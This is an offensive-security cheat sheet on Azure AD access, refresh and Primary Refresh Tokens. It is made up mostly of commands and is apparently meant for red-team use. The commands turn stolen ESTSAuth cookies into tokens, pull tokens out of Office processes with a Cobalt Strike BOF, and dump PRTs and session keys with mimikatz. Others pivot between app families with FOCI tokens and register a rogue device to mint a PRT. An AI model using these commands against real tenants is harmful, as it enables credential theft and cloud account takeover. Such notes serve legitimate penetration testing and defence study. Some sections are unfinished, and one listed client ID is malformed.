# Azure AD Tokens


## Access Token

Decode access tokens: [jwt.ms](https://jwt.ms/)

* Request an access token using a service principal password
    ```ps1
    curl --location --request POST 'https://login.microsoftonline.com/<tenant-name>/oauth2/v2.0/token' \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'client_id=<client-id>' \
    --data-urlencode 'scope=https://graph.microsoft.com/.default' \
    --data-urlencode 'client_secret=<client-secret>' \
    --data-urlencode 'grant_type=client_credentials'
    ```
* Use an access token
    ```ps1
    # use the jwt
    $token = "eyJ0eXAiO..."
    $secure = $token | ConvertTo-SecureString -AsPlainText -Force
    Connect-MgGraph -AccessToken $secure

    # whoami
    Get-MgContext
    Disconnect-MgGraph
    ```


## Refresh Token

* Requesting a token using credentials
    ```ps1
    TODO
    ```
* 


### Get a Refresh Token from ESTSAuth Cookie

`ESTSAuthPersistent` is only useful when a CA policy actually grants a persistent session. Otherwise, you should use `ESTSAuth`.

```ps1
TokenTacticsV2> Get-AzureTokenFromESTSCookie -ESTSAuthCookie "0.AS8"
TokenTacticsV2> Get-AzureTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie "0.AbcAp.."
```


### Get a Refresh Token from Office process

* [trustedsec/CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF)
```ps1
load bofloader
execute_bof /opt/CS-Remote-OPs-BOF/Remote/office_tokens/office_tokens.x64.o --format-string i  7324
```


## FOCI Refresh Token

FOCI allows applications registered with Azure AD to share tokens, minimizing the need for separate authentications when a user accesses multiple applications that are part of the same "family."

* [secureworks/family-of-client-ids-research/](https://github.com/secureworks/family-of-client-ids-research/blob/main/scope-map.txt) - Research into Undocumented Behavior of Azure AD Refresh Tokens

**Generate tokens**   

```ps1
roadtx gettokens --refresh-token <refresh-token> -c <foci-id> -r https://graph.microsoft.com 
roadtx gettokens --refresh-token <refresh-token> -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46
```

```
scope               resource                                client                              
.default            04b07795-8ddb-461a-bbee-02f9e1bf7b46    04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    1950a258-227b-4e31-a9cf-717495945fc2    1950a258-227b-4e31-a9cf-717495945fc2
                    https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    https://graph.windows.net               00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
Files.Read.All      d3590ed6-52b3-4102-aeff-aad2292ab01c    d3590ed6-52b3-4102-aeff-aad2292ab01c
                    https://graph.microsoft.com             3590ed6-52b3-4102-aeff-aad2292ab01c
                    https://outlook.office.com              1fec8e78-bce4-4aaf-ab1b-5451cc387264
Mail.ReadWrite.All  https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2
                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2
                    https://outlook.office365.com           00b41c95-dab0-4487-9791-b9d2c32c80f2
```


## Primary Refresh Token

* Use PRT token
    ```ps1
    roadtx browserprtauth --prt <prt-token> --prt-sessionkey <session-key>
    roadtx browserprtauth --prt roadtx.prt -url http://www.office.com
    ```


### Extract PRT v1

```ps1
mimikatz # token::elevate
mimikatz # sekurlsa::cloudap
mimikatz # sekurlsa::dpapi
mimikatz # dpapi::cloudapkd /keyvalue:<key-value> /unprotect
roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url https://portal.azure.com
```


### Extract PRT on Device with TPM

* No method known to date.


### Upgrade Refresh Token to PRT

```ps1
# Get correct token audience
roadtx gettokens -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r urn:ms-drs:enterpriseregistration.windows.net --refresh-token file

# Registering device
roadtx device -a register -n <device-name>

# Request PRT 
roadtx prt --refresh-token <refresh-token> -c <device-name>.pem -k <device-name>.key

# Use a PRT
roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
```


## References

* [Hacking Your Cloud: Tokens Edition 2.0 - Edwin David - April 13, 2023](https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0)
* [Microsoft 365 Developer Program](https://developer.microsoft.com/en-us/microsoft-365/dev-program)